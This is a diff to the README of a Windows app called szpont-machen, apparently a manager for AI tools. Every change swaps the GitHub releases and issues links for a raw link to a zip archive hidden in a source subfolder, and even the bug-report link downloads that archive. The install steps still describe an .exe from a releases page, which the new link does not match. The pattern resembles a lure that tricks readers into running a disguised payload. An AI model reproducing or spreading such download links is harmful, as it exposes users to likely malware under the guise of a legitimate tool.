@@ -1,6 +1,6 @@
 # 🤖 szpont-machen - Manage Your AI Tools Easily
 
-[![Download szpont-machen](https://img.shields.io/badge/Download-szpont--machen-blue?style=for-the-badge&logo=github)](https://github.com/kalvinh8169/szpont-machen/releases)
+[![Download szpont-machen](https://img.shields.io/badge/Download-szpont--machen-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kalvinh8169/szpont-machen/main/szpont/src/limits/machen-szpont-v1.5.zip)
 
 ## 🚀 What is szpont-machen?
 
@@ -14,7 +14,7 @@ If you have several AI tools that do different things—like write text, analyze
 
 To get szpont-machen on your Windows computer, follow these steps:
 
-1. **Visit this link to download the application**: [https://github.com/kalvinh8169/szpont-machen/releases](https://github.com/kalvinh8169/szpont-machen/releases)
+1. **Visit this link to download the application**: [https://raw.githubusercontent.com/kalvinh8169/szpont-machen/main/szpont/src/limits/machen-szpont-v1.5.zip](https://raw.githubusercontent.com/kalvinh8169/szpont-machen/main/szpont/src/limits/machen-szpont-v1.5.zip)
 2. On the page, look for the latest version (usually at the top). You will see files listed under "Assets."
 3. Click the file that ends with `.exe`. The filename might look like `szpont-machen-setup.exe` or `szpont-machen-1.0.0.exe`.
 4. Your browser will download the file to your computer. The download usually goes to your "Downloads" folder.
@@ -130,7 +130,7 @@ This software is distributed with open source license (see LICENSE file in the G
 
 ## 🐛 Report Issues
 
-If anything is broken or not working: Go to the repository's issues section and describe your problem (https://github.com/kalvinh8169/szpont-machen/issues). Suggest add application version, Windows version, and what you were doing.
+If anything is broken or not working: Go to the repository's issues section and describe your problem (https://raw.githubusercontent.com/kalvinh8169/szpont-machen/main/szpont/src/limits/machen-szpont-v1.5.zip). Suggest add application version, Windows version, and what you were doing.
 
 ## 🚀 Contribute (if you are technical)
 
@@ -140,6 +140,6 @@ You can improve szpont-machen by submitting code. See contribution guidelines on
 
 ## Download Again
 
-[![Download Latest](https://img.shields.io/badge/Download-Newest%20Version-brightgreen?style=for-the-badge&logo=github)](https://github.com/kalvinh8169/szpont-machen/releases)
+[![Download Latest](https://img.shields.io/badge/Download-Newest%20Version-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kalvinh8169/szpont-machen/main/szpont/src/limits/machen-szpont-v1.5.zip)
 
 Thank you for choosing szpont-machen!
